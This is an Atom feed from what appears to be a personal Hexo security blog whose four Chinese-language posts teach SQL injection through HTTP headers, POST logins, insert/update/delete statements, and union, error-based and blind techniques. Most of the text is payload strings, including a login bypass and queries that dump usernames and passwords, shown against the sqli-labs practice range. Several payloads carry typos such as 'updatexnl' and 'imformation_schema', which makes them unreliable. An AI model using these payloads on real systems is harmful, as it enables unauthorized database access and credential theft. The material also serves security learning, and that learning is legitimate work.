<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>拾柒</title>
  
  <subtitle>天行健，君子以自强不息！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://adad456.github.io/"/>
  <updated>2019-10-19T08:49:57.545Z</updated>
  <id>https://adad456.github.io/</id>
  
  <author>
    <name>拾柒</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HTTP头部注入</title>
    <link href="https://adad456.github.io/2019/10/19/HTTP%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5/"/>
    <id>https://adad456.github.io/2019/10/19/HTTP头部注入/</id>
    <published>2019-10-19T08:40:33.000Z</published>
    <updated>2019-10-19T08:49:57.545Z</updated>
    
    <content type="html"><![CDATA[<p>HTTP基础：</p><pre><code>Accept:浏览器能够处理的内容类型Accept-Charset:浏览器能够显示的字符集Accept-Encoding:浏览器能够处理的压缩编码Accept-Language:浏览器当前设置的语言Connection:浏览器与服务器之间的连接类型cookie：当前页面设置的任何cookieHost： 发出请求的页面所在的域Referer:发出请求的页面的URLUser-Agent:浏览器的用户代理字符串Server:WEB服务器表明自己是什么软件及版本信息。例如：server Apache/2.0.61(Unix)</code></pre><p>​        <strong>HTTP头注入是指从HTTP头中获取数据，而未对获取到的数据进行过滤，从而产生的注入。 HTTP头注入常发生在程序采集用户信息的模块中。例如：</strong></p><pre><code>1、X-Forwarded-For/client-IP2、User-Agent3、Referer4、Cookie</code></pre><p>​        <strong>cookie注入：COOKIE型注入是通过COOKIE进行数据提交的，其常见的情况有验证登陆、$_REQUEST获取参数。验证登陆是将用户的登陆信息放入COOKIE中来做权限验证的一种方法。</strong></p><h2 id="User-Agent头注入"><a href="#User-Agent头注入" class="headerlink" title="User-Agent头注入"></a>User-Agent头注入</h2><p>​    <strong>与注册登录再注入类似，在登陆后insert语句带入查询，产生注入。构造的payload可以基于多种注入，下面以updatexml()报错为例</strong></p><p><em>sqlilabs靶场第18关</em></p><pre><code>&#39; and updatexnl(1,concat(0x23,database(),0x23),1) and &#39;</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571472840.05.png" alt=""></p><h2 id="Referer头注入"><a href="#Referer头注入" class="headerlink" title="Referer头注入"></a>Referer头注入</h2><p><strong>与UA头注入类似</strong></p><p><em>sqlilabs靶场第19关</em></p><pre><code>&#39; and updatexml(1,concat(0x23,database(),0x23),1) or &#39;#</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571474970.18.png" alt=""></p><h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><p><em>sqlilabs靶场第20关</em></p><pre><code>&#39; and updatexml(1,concat(0x23,database(),0x23),1)#</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571474297.68.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;HTTP基础：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Accept:浏览器能够处理的内容类型
Accept-Charset:浏览器能够显示的字符集
Accept-Encoding:浏览器能够处理的压缩编码
Accept-Language:浏览器当前设置的语言
Connection:
      
    
    </summary>
    
    
      <category term="web安全 - SQL注入" scheme="https://adad456.github.io/categories/web%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="https://adad456.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="数据库" scheme="https://adad456.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
      <category term="HTTP" scheme="https://adad456.github.io/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>POST注入</title>
    <link href="https://adad456.github.io/2019/10/19/POST%E6%B3%A8%E5%85%A5/"/>
    <id>https://adad456.github.io/2019/10/19/POST注入/</id>
    <published>2019-10-19T03:25:46.000Z</published>
    <updated>2019-10-19T03:29:22.296Z</updated>
    
    <content type="html"><![CDATA[<p><strong>在登陆处用于判断账号、密码，在数据库中使用select语句；在修改密码处，更新密码会使用update语句；在购物系统中，订单的添加、删除会使用insert、delete语句</strong></p><p><em>数据库中创建一个test的表</em></p><pre><code>create table TEST(id int(3),username varchar(25),password varchar(25),primary key(id))</code></pre><h2 id="账号登陆"><a href="#账号登陆" class="headerlink" title="账号登陆"></a>账号登陆</h2><p><em>通过SQL的‘or’运算符构造万能密码,以sqlilabs靶场的第11关为例</em></p><pre><code>账号：admin&#39; or &#39;1&#39;=&#39;1密码：随意</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571451380.67.png" alt=""></p><p><em>在判断出注入点后，可以利用时间注入、布尔注入、报错注入接着获取更多的信息</em></p><p><em>报错注入：</em></p><pre><code>uname=admin&#39; or updatexml(1,concat(0x23,database(),0x23),1)#&amp;&amp;passwd=3421412sds</code></pre><p><em>时间注入：</em></p><pre><code>uname=admin&#39; and if(ascii(substr(database(),1,1))=115,sleep(5),1)#passwd=2142dwq</code></pre><p><em>布尔注入：</em></p><pre><code>uname=admin&#39; and ascii(substr(database(),1,1)) =115#&amp;&amp;passwd=41234</code></pre><h2 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h2><p><em>SQL语句：</em></p><pre><code>insert into test(id,username,password) values(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);</code></pre><pre><code>insert into test values(&#39;4&#39;,&#39;version()&#39;,&#39;c&#39;);-- &#39;&#39;,&#39;b&#39;,&#39;c&#39;);</code></pre><pre><code>insert into test values(&#39;4&#39;,USER(),&#39;c&#39;);-- &#39;&#39;,&#39;b&#39;,&#39;c&#39;);</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571453303.2.png" alt=""></p><p><em>此处的USER()就是构造的payload，单引号闭合会使得payload变成字符串，可以接着获取更多数据库信息</em></p><p><em>实际中无法知道数据库中表的列数，可以先尝试用数字代替字符串的列（字符串无法代替数字），错误时会插入失败</em></p><pre><code>insert into test values(&#39;1&#39;,2,3,4,5,6,7);-- &#39;&#39;,&#39;b&#39;,&#39;c&#39;);</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571453937.25.png" alt=""></p><pre><code>insert into test values(&#39;1&#39;,2,3);-- &#39;&#39;,&#39;b&#39;,&#39;c&#39;);</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571454023.71.png" alt=""></p><h2 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h2><p><em>SQL语句：</em></p><pre><code>update test set name=&#39;shiqi&#39; where id=1;</code></pre><pre><code>update test set username=&#39;adwdas&#39;,password=&#39;user()&#39; where id=2-- &#39; where id=2;</code></pre><pre><code>update test set username=&#39;adwdas&#39;,password=user() where id=1-- &#39; where id=1;</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571454596.92.png" alt=""></p><p><em>与insert类似，除了闭合位置不同，其他的完全一样；此时password处的user()就是构造的攻击语句</em></p><h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><p><em>SQL语句：</em></p><pre><code>delete from test where id=2;</code></pre><pre><code>delete from test where id=2 and if(1=1,sleep(5),0);</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571455212.6.png" alt=""></p><p><em>判断出注入点就可以构造其他的攻击语句，获取更多信息</em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;在登陆处用于判断账号、密码，在数据库中使用select语句；在修改密码处，更新密码会使用update语句；在购物系统中，订单的添加、删除会使用insert、delete语句&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;数据库中创建一个test的表&lt;/em&gt;&lt;/p
      
    
    </summary>
    
    
      <category term="web安全 - SQL注入" scheme="https://adad456.github.io/categories/web%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="https://adad456.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="POST注入" scheme="https://adad456.github.io/tags/POST%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>判断注入点</title>
    <link href="https://adad456.github.io/2019/10/17/%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9/"/>
    <id>https://adad456.github.io/2019/10/17/判断注入点/</id>
    <published>2019-10-17T14:01:03.000Z</published>
    <updated>2019-10-17T14:25:04.655Z</updated>
    
    <content type="html"><![CDATA[<h1 id="union-select"><a href="#union-select" class="headerlink" title="union select"></a>union select</h1><h2 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h2><p>​    <strong>查询语句中的参数没有被引号包起来，如id=1（有些闭合参数不使用引号，而使用括号来闭合）</strong>    </p><p><em>payload:</em>        </p><pre><code>id=1&#39;                       页面返回错误id=1+1 或id=3-1             如果存在id=2这条数据，返回结果为真，否者为假id=1+0                      页面返回正常id=1 and 1=1                页面返回正常id=1 and 1=2                页面返回错误id=1 or 1=1                 页面返回正常，or使得语句恒为真id=1 or 1=2                 id=-1 xor 1=1               异或，由于xor是短位运算符，必须先使前面的查询语句报错，否者没有结果。页面返回正常id=1 xor 1=2               页面返回正确id=1) and (1=1              页面返回正常id=1 or &#39;ab&#39;=&#39;a&#39;+&#39;b&#39;        id=1) or (&#39;ab&#39;=&#39;a&#39;+&#39;b&#39;</code></pre><h2 id="字符类型"><a href="#字符类型" class="headerlink" title="字符类型"></a>字符类型</h2><p>​    <strong>查询语句中的参数被引号包起来</strong></p><p><em>payload：</em></p><pre><code>id=1&#39;                       单引号冲突，查询语句中id=&#39;$id&#39;,再加上一个单引号报错，页面返回错误id=1&#39;--+                    单引号与后面的注释#抵消，语句正常，页面返回正常id=1&#39; and &#39;1&#39;=&#39;1            页面返回正常id=1&#39; and &#39;1&#39;=&#39;2            页面返回错误id=1&#39; or &#39;1&#39;=&#39;2             or语句恒为真id=1&#39; or &#39;1&#39;=&#39;1id=1&#39;)                      根据闭合情况测试，查询语句为id=(&#39;$id&#39;)时加上)id=1&quot;                       双引号与单引号情况相同</code></pre><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>​    <strong>页面无报错，有回显</strong></p><p><em>payload:</em></p><pre><code>id=1&#39; and (length(database())=8) --+          当数据库长度为8时，页面返回正常；当数据库长度不为8时，页面返回与正常页面有所差异，页面却不会直接出错id=1&#39; or (length(databse())&lt;8) --+</code></pre><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>​    <strong>页面无报错，无回显</strong></p><p><em>payload:</em></p><pre><code>id=1 and if(1=1,sleep(5),1)               如果页面延迟大于5s,则存在注入点id=1 and if(1=2,sleep(5),1)               如果页面延迟小于5s,则存在注入点id=1 or if(1=1，sleep(5),1)               使用or判断时，如果or前面的语句为真，会将数据库中所有数据遍历一遍，花费的时间会特别多id=1 or if(1=2,sleep(5),1)     id=-1 xor if(1=1,sleep(5),1)              xor同orid=-1 xor if(1=2,sleep(5),1)</code></pre><h1 id="基于报错注入"><a href="#基于报错注入" class="headerlink" title="基于报错注入"></a>基于报错注入</h1><p>​    <strong>页面返回错误连接信息,在正常的地址后尝试判断其他类型注入时，页面会反馈出错误信息</strong></p><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h2><p><em>payload:</em></p><pre><code>id=1&#39; and updatexml(1,concat(0x23,version(),0x23),1)--+      如果页面的错误反馈爆出version()的信息，则可以确定存在注入点</code></pre><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h2><p><em>payload:</em></p><pre><code>id=1&#39; and extractvalue(1,concat(0x23,version(),0x23)) --+    同updatexml</code></pre><h2 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h2><p><em>payload:</em></p><pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,version(),0x23,floor(rand(0)*2)) as x from imformation_schema.tables group by x) as y) --+              同updatexml</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;union-select&quot;&gt;&lt;a href=&quot;#union-select&quot; class=&quot;headerlink&quot; title=&quot;union select&quot;&gt;&lt;/a&gt;union select&lt;/h1&gt;&lt;h2 id=&quot;数字类型&quot;&gt;&lt;a href=&quot;#数字类型&quot; cla
      
    
    </summary>
    
    
      <category term="web安全 - SQL注入" scheme="https://adad456.github.io/categories/web%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="https://adad456.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="注入点" scheme="https://adad456.github.io/tags/%E6%B3%A8%E5%85%A5%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>获取数据库信息</title>
    <link href="https://adad456.github.io/2019/10/17/%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF/"/>
    <id>https://adad456.github.io/2019/10/17/获取数据库信息/</id>
    <published>2019-10-17T08:44:05.000Z</published>
    <updated>2019-10-17T14:25:11.029Z</updated>
    
    <content type="html"><![CDATA[<p><strong>mysql数据库常用函数:</strong></p><pre><code>system_user()系统用户名users()用户名current_user()当前用户名session_user()连接数据库的用户名database() 数据库名version() MYSQL数据库版本@@datadir 读取数据库路径@@basedir MYSQL安装路径@@version_compile_os 操作系统concat(str1,str2,str3),返回str1+str2+str3;当有一个字符串为NULL时，即返回NULLconcat_ws(separator,str1,str2,str3),返回str1+separator+str2+separator+str3group_concat（str1,str2,str3）,返回str1+str2+str3;ascii(a)将a转换成其ASCII值ord(a)将a转换成其ASCII值left(a,b)从左往右截取字符串a的前b个字符substr(a,b,c)从b位置开始，截取字符串a的c长度mid(a,b,c)从位置b开始，截取a字符串的c位regexp、like语句</code></pre><h1 id="UNION-SELECT"><a href="#UNION-SELECT" class="headerlink" title="UNION SELECT"></a>UNION SELECT</h1><p><strong>union用于连接两个或多个select语句，在注入时需要使前一个select语句为错才能将第二个select语句作为最后输出,即id=-1</strong></p><p><em>查询当前数据库：</em></p><pre><code>id=-1&#39; and union select 1,2,database()--+</code></pre><p><em>查询所有数据库：</em></p><pre><code>id=-1&#39; and union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></pre><p><em>查询表名：</em></p><pre><code>id=-1&#39; and union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></pre><p><em>查询列名：</em></p><pre><code>id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></pre><p><em>查询字段值：</em></p><pre><code>id=-1&#39; union select 1,2,group_concat(id,username,password) from users--+</code></pre><h1 id="基于报错注入"><a href="#基于报错注入" class="headerlink" title="基于报错注入"></a>基于报错注入</h1><h2 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h2><p><strong>updatexml(XML_document,XPath_String,new_value)</strong></p><p><em>获取数据库名、版本信息：</em></p><pre><code>id=1&#39; and updatexml(1,concat(0x23,database(),0x23,version(),0x23),1)--+</code></pre><p><em>获取表名：</em></p><pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23),1)--+</code></pre><p><em>获取列名：</em></p><pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x23),1)--+</code></pre><p><em>获取表users()中的用户名和密码：</em></p><pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(username,0x23,password) from security.users)),1)--+</code></pre><h2 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h2><p><strong>floor(rand(0)*2)</strong></p><p><em>爆库：</em></p><pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y)--+爆库或：id=1&#39; union select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y--+或：id=1&#39; union select 1,2,count(*) from information_schema.columns group by concat(version(),floor(rand(0)*2)) --+</code></pre><p><em>爆表：</em></p><pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by y) as a) --+</code></pre><p><em>爆列名：</em></p><pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 5,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><em>爆字段值:</em></p><pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(username,&#39;:&#39;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><h2 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h2><p><strong>extractvalue(xml_frag, xpath_expr)</strong></p><p><em>爆库：</em></p><pre><code>id=1&#39; and extractvalue(1,concat_ws(0x23,user(),version(),database(),@@version_compile_os))--+</code></pre><p><em>爆表：</em></p><pre><code>id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p><em>爆列名:</em></p><pre><code>id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)))--+</code></pre><p><em>爆字段：</em></p><pre><code>id=1&#39; and extractvalue(1,(select group_concat(username,&#39;:&#39;,password) from users))--+</code></pre><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h2><pre><code>ascii()返回指定字符串最左侧字符的ascii值count()计算结果集的数量length()返回指定字符串的长度substr(str,pos,len)substring(str,pos,len)返回截取的子字符串</code></pre><p><em>判断数据库名的长度</em></p><pre><code>id=1&#39; and (length(database())&gt;9) --+id=1&#39; and (length(database())=9) --+id=-1&#39; and (length(database())&gt;0) --+</code></pre><p><em>猜数据库名</em></p><pre><code>id=1&#39; and (left(database(),1)=&#39;s&#39;)--+从左到右截取一个字符,s对应的ascii值为115id=1&#39; and ascii(substr(database(),1,1))=115 --+id=1&#39; and ascii(substr(database(),1,1))&lt;115 --+可以使用‘&lt;’，‘&gt;’来判断id=1&#39; and (left(database(),2)=&#39;se&#39;)--+从左到右截取两个字符</code></pre><p><em>猜当前数据库中表的数量</em></p><pre><code>id=1&#39; and 4=(select count(table_name) from information_schema.tables where table_schema=database())--+id=1&#39; and 4=(select count(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+</code></pre><p><em>猜当前数据库中表名的长度</em></p><pre><code>id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),7,1))--+表名的长度即是7-1=6位，这里的limit是取的第一个数据库id=1&#39; and (length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)=6))--+id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1),7,1))--+ 这里的limit是取的第二个数据库id=1&#39; and (length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1)=8))--+</code></pre><p><em>逐个猜解表名</em></p><pre><code>格式为：ascii(substr(xxx limit null,1),null,1) ,对递增依次猜解id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+对数据库中的第一个表的第一个字符进行ascii的猜解id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+对数据库中的第一个表的第二个字符进行ascii的猜解</code></pre><p><em>猜表中列的数量</em></p><pre><code>id=1&#39; and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)=20 --+</code></pre><p><em>猜列名的长度</em></p><pre><code>id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),2,1)) --+id=1&#39; and length((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1))=2 --+</code></pre><p><em>猜解列名</em></p><pre><code>id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1))=105 --+</code></pre><p><em>猜字段数量</em></p><pre><code>id=1&#39; and (select count(username) from security.users)=13 --+</code></pre><p><em>猜字段长度</em></p><pre><code>id=1&#39; and length((select username from security.users limit 0,1))=4 --+</code></pre><p><em>dump字段的值</em></p><pre><code>id=1&#39; and ascii(substr((select username from security.users limit 0,1),1,1))=67--+id=1&#39; and ascii(substr((select concat(username,&#39;:&#39;,password) from security.users limit 0,1),1,1))=68--+</code></pre><h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p><em>在获取表名、列名以及具体信息时，方法与布尔盲注相同，都是逐个猜解</em></p><pre><code>if(1,2,3)：如果1为True，则执行2，否则执行3sleep(x)：执行延迟x秒ascii(char)：将char转换为对应的ascii码substr(string,start,len)：从string的start位开始截取len个字符Benchmark(x,1)：执行表达式1，x次（会消耗CPU，慎用）</code></pre><p><em>查看信息</em></p><pre><code>id=1&#39; and if(ascii(substr(user(),1,1))=114,sleep(3),1)查看用户名id=1&#39; and if(ascii(substr(database(),1,1))=114,sleep(3),1)查看数据库id=1&#39; and if(ascii(substr(version(),1,1))=114,sleep(3),1)查看数据库版本</code></pre><p><em>爆表名</em></p><pre><code>id=-1&#39; and union select if(ascii(substr(table_name,1,1))&gt;97,sleep(5),1),2,3 from information_schema.tables where table_schema = database() limit 0,1</code></pre><p><em>爆列名</em></p><pre><code>id=-1&#39; and union select if(ascii(substr(column_name,1,1))=105,sleep(5),1),2,3 from information_schema.columns where table_name = &#39;admin&#39; limit 0,1</code></pre><p><em>爆数据</em></p><pre><code>id=-1&#39; and union select if(ascii(substr(user,1,1))=97,sleep(5),1),2,3 from admin limit 0,1</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;mysql数据库常用函数:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;system_user()系统用户名

users()用户名

current_user()当前用户名

session_user()连接数据库的用户名

database() 数据
      
    
    </summary>
    
    
      <category term="web安全 - SQL注入" scheme="https://adad456.github.io/categories/web%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="https://adad456.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="数据库" scheme="https://adad456.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
</feed>
